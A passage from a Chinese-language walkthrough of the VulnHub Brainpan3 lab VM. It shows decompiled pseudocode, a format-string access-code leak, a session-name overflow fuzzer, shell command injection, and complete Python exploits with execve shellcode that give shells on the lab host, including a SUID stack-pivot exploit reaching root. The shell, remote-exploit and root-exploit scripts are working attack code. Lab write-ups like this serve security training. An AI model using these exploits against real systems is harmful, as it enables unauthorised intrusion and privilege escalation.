  struct tm *tp; // [esp+34h] [ebp-54h]
  char s; // [esp+3Ah] [ebp-4Eh]
  char dest[4]; // [esp+54h] [ebp-34h]
  int v8; // [esp+58h] [ebp-30h]
  int v9; // [esp+5Ch] [ebp-2Ch]
  int v10; // [esp+60h] [ebp-28h]
  int v11; // [esp+64h] [ebp-24h]
  __int16 v12; // [esp+68h] [ebp-20h]
  unsigned int v13; // [esp+7Ch] [ebp-Ch]

  v13 = __readgsdword(0x14u);
  stream = 0;
  time(&timer);
  tp = localtime(&timer);
  strftime(&s, 0x1Au, "%Y%m%d%H%M%S", tp);
  memset(dest, 0, 0x28u);
  *(_DWORD *)dest = 1836017711;
  v8 = 1851862885;
  v9 = 1769172577;
  v10 = 1346720303;
  v11 = 1398035023;
  v12 = 47;
  strcat(dest, &s);
  v1 = &dest[strlen(dest)];
  *(_DWORD *)v1 = 1885696558;
  v1[4] = 0;
  printf("[+] WRITING REPORT TO %s\n", dest);
  stream = fopen(dest, "w");
  fputs(a1, stream);
  fclose(stream);
  strncpy(REPORT, a1, 0x64u);
  return feedback();
}
```

 - record_id

``` bash
int __cdecl record_id(char *src)
{
  char dest; // [esp+19h] [ebp-Fh]
  int (*v3)(); // [esp+1Ch] [ebp-Ch]

  v3 = feedback;
  strcpy(&dest, src);
  v3();
  return atoi(&dest);
}
```

 - feedback

``` bash
int feedback()
{
  puts("[+] DATA SUCCESSFULLY ENCRYPTED");
  return puts("[+] DATA SUCCESSFULLY RECORDED");
}
```

因此，代码首先检查本地主机名是否为brainpain3，并假设本地主机名是brainpain3，它将report数据复制到&dest，并使用mprotect使REPORT数据可执行。之后，它检查第二个参数。

 - 1:将使用sanitize函数过滤&dest中的数据，然后对其进行加密，最后使用record_data函数进行存储，该函数将数据存储到文件中，并将前100个字节复制到REPORT中。
 - 2:数据将直接存储而无需任何过滤或加密，并且将调用附加函数record_id，现在这是一个有趣的函数。

当查看record_id函数时，可以看到它为pfeedback分配了一个函数指针，然后将&dest的内容复制到dest中，由于dest最多只能容纳3个字节，因此我们可以溢出它并控制pfeedback指针，该指针将在之后执行strcpy导致代码执行。

在kali中使用gdb调试如下所示

![](https://r3v3rs3r.files.wordpress.com/2015/09/poc1.png)

因此，总结一下：因为前100个字节存储在可执行位置（REPORT），并且可以控制函数指针（pfeedback），所以可以在REPORT中存储一些shellcode，然后使pfeedback指针指向我的shellcode。可以在IDA中查找REPORT的地址：

``` bash
.bss:0804B0A0                 public REPORT
.bss:0804B0A0 ; char REPORT[500]
.bss:0804B0A0 REPORT          db 1F4h dup(?)          ; DATA XREF: record_data+131↑o
.bss:0804B0A0                                         ; main+7D↑o
.bss:0804B0A0 _bss            ends
.bss:0804B0A0
```
漏洞利用缓冲区可能类似于：

``` bash
AAA<REPORT_address+7><shellcode>
```

请注意，必须在REPORT地址上添加7，以越过3个A和4个字节的函数指针。

 - python版POC代码

``` bash
import struct
import sys
 
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
__REPORT = 0x0804B0A0
 
def p(v):
    return struct.pack('<L', v)
 
payload  = 'AAA'
payload += p(__REPORT + 7)
payload += shellcode
 
print payload + ' 0'
```

执行poc会按预期生成一个shell

``` bash
root@kali:~/vulnhub/brainpan3#./report $(./poc.py)
[+] WRITING REPORT TO /home/anansi/REPORTS/20150912020038.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
$ id
uid=1000(root) gid=1001(root) groups=1001(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),105(scanner),108(bluetooth),112(netdev),125(powerdev)
$
```

#### brainpan console - report功能

现在，如果还记得，由于禁用了report功能，目前无法在brainpan控制台中创建report，因此必须启用它，现在这就是“update session name”选项（3）中缓冲区溢出起作用的地方。通过溢出session name缓冲区，可以控制以下值：

``` bash
AUTH   [Y]    REPORT [N]    MENU   [Y]
```

通过将REPORT [N]设置为Y，将启用REPORT功能。一个模糊测试脚本可以帮助找到正确的长度，直到覆盖N

``` bash
from select import select
from socket import *
from time import sleep
import telnetlib
import sys
import struct
import re
 
class NetcatClient:
    def __init__(self, host, port):
        """
        Netcat Class init.
        """
        self.host = host
        self.port = int(port)
        self.delay = 0.05
        self.linemode = False
        self.sock = socket(AF_INET, SOCK_STREAM)
 
    # private functions
    def __check_state(self, timeout=0):
        """
        Check the socket it's read, write and exception state 
        using select
        """
        # we need abit of a delay to keep things
        # running smooth
        sleep(self.delay)
        return select([self.sock], [self.sock], [self.sock], timeout)
 
    # core functions
    def connect(self):
        """
        Connect to host
        """
        try:
            self.sock.connect((self.host, self.port))
            return True
        except error as e:
            print 'NetcatClassError:', e
            return False
 
    def close(self):
        """
        Close the connection
        """
        try:
            self.sock.close()
        except error as e:
            print 'NetcatClassError:', e
 
    def recv(self, size=4096):
        """
        Recieve all data
        """
        try:
            data = ''
            readable, writable, exceptional = self.__check_state()
            if readable:
                # while socket readable...
                while readable:
                    # collect all data
                    data += self.sock.recv(size)
                    # re-check socket's state
                    readable, writable, exceptional = self.__check_state()
            return data
        except error as e:
            print 'NetcatClassError:', e
 
    def send(self, data):
        """
        Send data
        """
        if self.linemode:
            data += '\n'
        try:
            readable, writable, exceptional = self.__check_state()
            if writable:
                self.sock.send(data)
        except error as e:
            print 'NetcatClassError:', e
 
    def sendrecv(self, data):
        """
        Send and recieve data
        """
        self.send( data )
        return self.recv()
 
    def interact(self):
        """
        Interactive telnet client
        """
        try:
            t = telnetlib.Telnet()
            t.sock = self.sock
            t.interact()
            t.close()
        except KeyboardInterrupt:
            self.close()
 
if __name__ == '__main__':
    # fuzzing code
    s = NetcatClient('192.168.56.117', '1337')
    s.linemode = True
    s.connect()
    # banner
    s.recv()
    # send format string pattern and grab the login code
    r = s.sendrecv('%3$d')
    # parse the login code from the reponse
    l = re.findall(r"INVALID ACCESS CODE: (.*?)\n", r)
    print 'login code -> ', l
    # send login code and log in
    s.sendrecv('%s'%(l[0]))
 
    # send change sessionname commands
    # with length of 0 ... 255
    for i in range(256):
        s.sendrecv('3')
        resp = s.sendrecv(i * 'Y')
        l = re.findall(r"REPORT \[(.*?)\]", resp)
        print i,'->',l
        # if value changed to Y break
        if 'Y' in l[0]:
            print 'payload -> %d * Y' % (i)
            break
 
    s.close()
```

运行模糊测试器会导致：

``` bash
root@kali:~/vulnhub/brainpan3# python test.py 
login code ->  ['2433']
0 -> ['N']
1 -> ['N']
2 -> ['N']
3 -> ['N']
4 -> ['N']
5 -> ['N']
6 -> ['N']
7 -> ['N']
8 -> ['N']
9 -> ['N']
10 -> ['N']
11 -> ['N']
12 -> ['N']
13 -> ['N']
14 -> ['N']
15 -> ['N']
16 -> ['N']
17 -> ['N']
18 -> ['N']
19 -> ['N']
20 -> ['N']
21 -> ['N']
22 -> ['N']
23 -> ['N']
24 -> ['N']
25 -> ['N']
26 -> ['N']
27 -> ['N']
28 -> ['N']
29 -> ['N']
30 -> ['N']
31 -> ['N']
32 -> ['N']
...
244 -> ['N']
245 -> ['N']
246 -> ['N']
247 -> ['N']
248 -> ['N']
249 -> ['N']
250 -> ['N']
251 -> ['\x00']
252 -> ['\x00']
253 -> ['Y']
payload -> 253 * Y
```

因此，通过将session名称设置为253个Y字符，将REPORT功能状态从N更改为Y，从而有效地启用了report功能。

``` bash
ENTER COMMAND: 3
SELECTED: 3
ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

在测试该选项时，现在可以看到其确实启用了……

``` bash
ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

fuckfuckfuckfuckfuck

REPORT [fuckfuckfuckfuckfuck@]
SENDING TO REPORT MODULE

[+] WRITING REPORT TO /home/anansi/REPORTS/20200205215605.rep
[+] DATA SUCCESSFULLY ENCRYPTED
[+] DATA SUCCESSFULLY RECORDED
[+] RECORDED [II]

--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

因此，现在可以在Brainpan控制台中创建报告，并在报告可执行文件中触发易受攻击的代码，不是吗？似乎Brainpan控制台使用1选项执行了报告可执行文件，并且为了触发record_id中的易受攻击的代码，需要使用0选项来执行它。在这里有些卡住，要在报告缓冲区中打更多的主意。在报表数据中插入双引号时，会出现一个有趣的错误

``` bash
ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

aaa"

REPORT [aaa"fuckfuckfuckfuck@]
SENDING TO REPORT MODULE

sh: 1: Syntax error: Unterminated quoted string

--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

似乎双引号引起了执行报告命令行时的错误，更准确地说，是未引用的字符串的一部分，但更有趣的是，似乎可以使用报告数据进行命令注入。

``` bash
ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

";id;"

REPORT [";id;"ckfuckfuckfuck@]
SENDING TO REPORT MODULE

/var/www/repo/report <report> [0|1]
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
sh: 1: ckfuckfuckfuck@: not found

--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

";ls;"          

REPORT [";ls;"ckfuckfuckfuck@]
SENDING TO REPORT MODULE

/var/www/repo/report <report> [0|1]
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
sh: 1: ckfuckfuckfuck@: not found

--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

还可以在命令行中插入0来触发record_id中的易受攻击的代码

``` bash
ENTER COMMAND: 1
SELECTED: 1

ENTER REPORT, END WITH NEW LINE:

aasdcasdc" 0 #

REPORT [aasdcasdc" 0 #ckfuck@]
SENDING TO REPORT MODULE

Segmentation fault (core dumped)

--------------------------------------------------------------
SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF
```

#### 编写python脚本来利用

 – 获取登录代码并登录
 – 启用report功能
 – 发送包含0选项的payload report
 – 获取shell

以下代码自动完成了整个过程：

report.py

``` bash
from select import select
from socket import *
from time import sleep
import telnetlib, sys, re, struct
 
 
class NetcatClass:
    def __init__(self, host, port):
        """
        Netcat Class init.
        """
        self.host = host
        self.port = int(port)
        self.delay = 0.05
        self.linemode = False
        self.sock = socket(AF_INET, SOCK_STREAM)
 
    # private functions
    def __check_state(self, timeout=0):
        """
        Check the socket it's read, write and exception state 
        using select
        """
        # we need abit of a delay to keep things
        # running smooth
        sleep(self.delay)
        return select([self.sock], [self.sock], [self.sock], timeout)
 
    # core functions
    def connect(self):
        """
        Connect to host
        """
        try:
            self.sock.connect((self.host, self.port))
            return True
        except error as e:
            print 'NetcatClassError:', e
            return False
 
    def close(self):
        """
        Close the connection
        """
        try:
            self.sock.close()
        except error as e:
            print 'NetcatClassError:', e
 
    def recv(self, size=4096):
        """
        Recieve all data
        """
        try:
            data = ''
            readable, writable, exceptional = self.__check_state()
            if readable:
                # while socket readable...
                while readable:
                    # collect all data
                    data += self.sock.recv(size)
                    # re-check socket's state
                    readable, writable, exceptional = self.__check_state()
            return data
        except error as e:
            print 'NetcatClassError:', e
 
    def send(self, data):
        """
        Send data
        """
        try:
            readable, writable, exceptional = self.__check_state()
            if writable:
                if self.linemode:
                    data += '\n'
                self.sock.sendall(data)
        except error as e:
            print 'NetcatClassError:', e
 
    def sendrecv(self, data):
        """
        Send and recieve data
        """
        self.send(data)
        return self.recv()
 
    def interact(self):
        """
        Interactive telnet client
        """
        try:
            t = telnetlib.Telnet()
            t.sock = self.sock
            t.interact()
            t.close()
        except KeyboardInterrupt:
            self.close()
 
 
def p(v):
    return struct.pack('<L', v)
 
def exploit(host, port):
    # connect
    s = NetcatClass(host, port)
    # make all sends being treathed as line's eq. add a \n
    s.linemode = True
    s.connect()
    # recieve banner
    s.recv()
    # send formatstring pattern and read response containing access code    
    print '[+] Leak access code'
    acccode = re.findall(r"INVALID ACCESS CODE: (.*?)\n", s.sendrecv('%3$d'))
    if not acccode:
        print '[!] Failed to get access code!'
        s.close()
        exit()  
    print '[+] Access code leaked: {}'.format(acccode[0])
    # send access code
    s.sendrecv(acccode[0])
    # enable report feature
    print '[+] Enabling report feature'
    s.sendrecv('3')
    s.sendrecv(253 * 'Y')
    # create payload
    # linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
    # http://shell-storm.org/shellcode/files/shellcode-752.php
    shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    # .bss:0804B0A0 ; char REPORT[500]
    # strncpy(REPORT, buf, 100u);
    __bss_REPORT = 0x0804B0A0
    # construct payload report  
    payload  = "AAA"
    payload += p(__bss_REPORT + 7)
    payload += shellcode
    # inject double qoute and a 0 to trigger
    # the vulnerable code in record_id
    payload += '" 0 #'
    # send payload report
    print '[+] Sending payload report'
    s.sendrecv('1')
    s.sendrecv( payload )
    # interactive shell?
    print '[+] Dropping into shell'
    s.send('python -c "import pty;pty.spawn(\'/bin/bash\')"')
    s.interact()
 
if __name__ == '__main__':
    exploit('192.168.56.117', '1337')
```

最后执行漏洞利用程序为anansi用户获取了一个shell。

``` bash
root@kali:~/vulnhub/brainpan3# python report.py 
[+] Leak access code
[+] Access code leaked: 2602
[+] Enabling report feature
[+] Sending payload report
[+] Dropping into shell
anansi@brainpan3:/$ id
id
uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
anansi@brainpan3:/$ whoami
whoami
anansi
anansi@brainpan3:/$ pwd
pwd
/
anansi@brainpan3:/$ ls
ls
bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz
boot  home        lib             mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lost+found      opt    run   sys   var
anansi@brainpan3:/$ cd home
cd home
anansi@brainpan3:/home$ ls
ls
anansi  puck  reynard
anansi@brainpan3:/home$ cd anansi
cd anansi
anansi@brainpan3:/home/anansi$ ls
ls
REPORTS  lapinblanc.txt
anansi@brainpan3:/home/anansi$ cat lapinblanc.txt
cat lapinblanc.txt

                     _       _
                    / \     / \
                   {   }   {   }
                   {   {   }   }
                    \   \ /   /
                     \   Y   /
                     .-"`"`"-.
                   ,`         `.
                  /             \
                 /               \
                {     ;"";,       }
                {  /";`'`,;       }
                 \{  ;`,'`;.     /
                  {  }`""`  }   /}
                  {  }      {  //  f o l l o w
                  {||}      {  /       m e
                  `"'       `"'
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub202.jpg)

#### reynard

在box上寻找时，发现reynard文件夹是可读的，并且在“/private/”文件夹中具有SUID可执行文件和加密文件

``` bash
anansi@brainpan3:/home/reynard/private$ ls -lah
ls -lah
total 20K
drwxrwx--- 2 reynard webdev  4.0K Jun 10  2015 .
drwxr-xr-x 3 reynard reynard 4.0K Jun 10  2015 ..
-rwsr-xr-x 1 reynard reynard 5.5K May 19  2015 cryptor
-r-------- 1 reynard reynard   77 May 21  2015 sekret.txt.enc
anansi@brainpan3:/home/reynard/private$ ./cryptor
./cryptor
Usage: ./cryptor file key
```

将两个文件都下载到了本地计算机，并开始分析cryptor可执行文件

``` bash
anansi@brainpan3:/home/anansi$ cp /home/reynard/private/cryptor .
cp /home/reynard/private/cryptor .
anansi@brainpan3:/home/anansi$ ls
ls
REPORTS  cryptor  lapinblanc.txt
anansi@brainpan3:/home/anansi$ python -m SimpleHTTPServer 8080
python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
192.168.56.1 - - [06/Feb/2020 05:45:39] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [06/Feb/2020 05:45:48] "GET /cryptor HTTP/1.1" 200 -
192.168.56.1 - - [06/Feb/2020 05:46:07] "GET /lapinblanc.txt HTTP/1.1" 200 -
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub203.jpg)

下面是它的c语言伪代码

main
``` bash
int __cdecl main(int a1, char **a2)
{
  int result; // eax

  if ( a1 > 2 )
  {
    sub_80485ED(a2[1], a2[2]);
    result = 0;
  }
  else
  {
    printf("Usage: %s file key\n", *a2);
    result = 1;
  }
  return result;
}
```

sub_80485ED
``` bash
int __cdecl sub_80485ED(char *src, char *nptr)
{
  char *v2; // eax
  int v3; // ebx
  int v4; // eax
  char s[100]; // [esp+Ch] [ebp-78h]
  int v7; // [esp+70h] [ebp-14h]
  FILE *stream; // [esp+74h] [ebp-10h]
  FILE *v9; // [esp+78h] [ebp-Ch]

  memset(dest, 0, 0x64u);
  memset(s, 0, 0x64u);
  if ( strlen(src) <= 0x74 )
    strcpy(s, src);
  else
    strncpy(s, src, 0x5Au);
  v2 = &s[strlen(s)];
  *(_DWORD *)v2 = 1668179246;
  v2[4] = 0;
  printf("[+] saving to %s\n", s);
  strcpy(dest, nptr);
  v9 = fopen(src, "r");
  if ( v9 )
  {
    for ( stream = fopen(s, "w"); ; fputc(v4 ^ v3, stream) )
    {
      v7 = fgetc(v9);
      if ( v7 == -1 )
        break;
      v3 = (char)v7;
      v4 = atoi(nptr);
    }
    fclose(stream);
    fclose(v9);
  }
  return 0;
}
```

从main函数开始，可以看到它将2个参数filename和key传递给cryptFile函数。在此函数中，它将对给定的文件名进行奇怪的长度检查，如果长度小于或等于116个字符，则会将完整文件名复制到100字节的pOutFilename缓冲区中，从而导致16字节的溢出。现在这还不足以溢出该函数的返回地址。

``` bash
stack layout
-00000078 pOutFile        db 100 dup(?)
-00000014 DataByte        dd ?
-00000010 fsin            dd ?                    ; offset
-0000000C fsout           dd ?                    ; offset
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 pFile           dd ?                    ; offset
+0000000C pKey            dd ?                    ; offset
```

但是，从cryptFile返回并离开main函数时，会发生有趣的事情。由于主要功能以leave指令退出。

``` bash
.text:08048786                 call    sub_80485ED
.text:0804878B                 mov     eax, 0
.text:08048790
.text:08048790 locret_8048790:                         ; CODE XREF: main+26↑j
.text:08048790                 leave
.text:08048791                 retn
```

leave说明与以下内容相同：

``` bash
mov esp, ebp
pop ebp
```

它有效地还原了堆栈指针，现在，在leave指令上放置一个断点并以116个字符的文件名启动可执行文件时，我们可以看到发生了什么

(gdb中调试的效果)
``` bash
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fba3c0 --> 0x0 
EDX: 0xfffff000 
ESI: 0x0 
EDI: 0x636e652e ('.enc')
EBP: 0xbffff400 ('A' )
ESP: 0xbffff480 --> 0xbffff69c ('A' )
EIP: 0x8048790 (leave)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048783:	mov    DWORD PTR [esp],eax
   0x8048786:	call   0x80485ed
   0x804878b:	mov    eax,0x0
=> 0x8048790:	leave  
   0x8048791:	ret    
   0x8048792:	xchg   ax,ax
   0x8048794:	xchg   ax,ax
   0x8048796:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xbffff480 --> 0xbffff69c ('A' )
0004| 0xbffff484 --> 0xbffff711 --> 0x53530041 ('A')
0008| 0xbffff488 --> 0xbffff508 --> 0x0 
0012| 0xbffff48c --> 0xb7e6fe46 (:	mov    DWORD PTR [esp],eax)
0016| 0xbffff490 --> 0x3 
0020| 0xbffff494 --> 0xbffff534 --> 0xbffff686 ("/root/vulnhub/brainpan3/cryptor")
0024| 0xbffff498 --> 0xbffff544 --> 0xbffff713 ("SSH_AGENT_PID=4019")
0028| 0xbffff49c --> 0xb7fdd860 --> 0xb7e59000 --> 0x464c457f 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048790 in ?? ()
```

EBP（0xbffff400）指向文件名缓冲区，并在执行成为ESP的离开指令时

``` bash
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fba3c0 --> 0x0 
EDX: 0xfffff000 
ESI: 0x0 
EDI: 0x636e652e ('.enc')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff404 ('A' )
EIP: 0x8048791 (ret)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048786:	call   0x80485ed
   0x804878b:	mov    eax,0x0
   0x8048790:	leave  
=> 0x8048791:	ret    
   0x8048792:	xchg   ax,ax
   0x8048794:	xchg   ax,ax
   0x8048796:	xchg   ax,ax
   0x8048798:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xbffff404 ('A' )
0004| 0xbffff408 ('A' )
0008| 0xbffff40c ('A' )
0012| 0xbffff410 ('A' )
0016| 0xbffff414 ('A' )
0020| 0xbffff418 ('A' )
0024| 0xbffff41c ('A' )
0028| 0xbffff420 ('A' )
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x08048791 in ?? ()
```

最后

``` bash
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fba3c0 --> 0x0 
EDX: 0xfffff000 
ESI: 0x0 
EDI: 0x636e652e ('.enc')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff408 ('A' )
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff408 ('A' )
0004| 0xbffff40c ('A' )
0008| 0xbffff410 ('A' )
0012| 0xbffff414 ('A' )
0016| 0xbffff418 ('A' )
0020| 0xbffff41c ('A' )
0024| 0xbffff420 ('A' )
0028| 0xbffff424 ('A' )
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x41414141 in ?? ()
```

那么该如何利用呢？请记住，密钥存储在全局缓冲区中，似乎cryptor是用可执行的堆栈和内存编译的，因此可以将Shellcode放在密钥缓冲区中，并在文件名缓冲区溢出中使用以返回该Shellcode来执行该Shellcode。

``` bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

 - Exploit:

``` bash
import struct

def p(v):
    return struct.pack('<L', v)

shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
__bss_key = 0x0804a080
argFile = 29 * p(__bss_key)
argKey = shellcode
print argFile + ' ' + argKey
```

执行漏洞利用程序时，它并不总是生效，只需多执行几次，直到它生效为止

``` bash
root@kali:~/vulnhub/brainpan3# ./cryptor $(python cryptthis.py)
[+] saving to �����������������������������.enc
段错误
root@kali:~/vulnhub/brainpan3# ./cryptor $(python cryptthis.py)
[+] saving to �����������������������������.enc
段错误
root@kali:~/vulnhub/brainpan3# ./cryptor $(python cryptthis.py)
[+] saving to �����������������������������.enc
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# pwd
/root/vulnhub/brainpan3
# uname -a
Linux kali 5.4.0-kali2-amd64 #1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64 GNU/Linux
# ls
bofh  cryptor  cryptthis.py  poc.py  report  report.py  shell  test.py
```

放在brainpan3上面运行poc

``` bash
anansi@brainpan3:/tmp$ echo "import struct

def p(v):
    return struct.pack('<L', v)

shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
__bss_key = 0x0804a080
argFile = 29 * p(__bss_key)
argKey = shellcode
print argFile + ' ' + argKeyecho "import struct
> 
> def p(v):
>     return struct.pack('<L', v)
> 
<\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'   
> __bss_key = 0x0804a080
> argFile = 29 * p(__bss_key)
> argKey = shellcode
> " > cryptthis.py
print argFile + ' ' + argKey" > cryptthis.py
anansi@brainpan3:/tmp$ ls
ls
cryptthis.py  vjGSL5d  vtSHi56
anansi@brainpan3:/tmp$ cat cryptthis.py
cat cryptthis.py
import struct

def p(v):
    return struct.pack('<L', v)

shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
__bss_key = 0x0804a080
argFile = 29 * p(__bss_key)
argKey = shellcode
print argFile + ' ' + argKey
anansi@brainpan3:/tmp$ python cryptthis.py
python cryptthis.py
����������������������������� 1����
                                   Qh//shh/bin��
anansi@brainpan3:/tmp$ cd /home
cd /home
anansi@brainpan3:/home$ ls
ls
anansi  puck  reynard
anansi@brainpan3:/home$ cd renard
cd renard
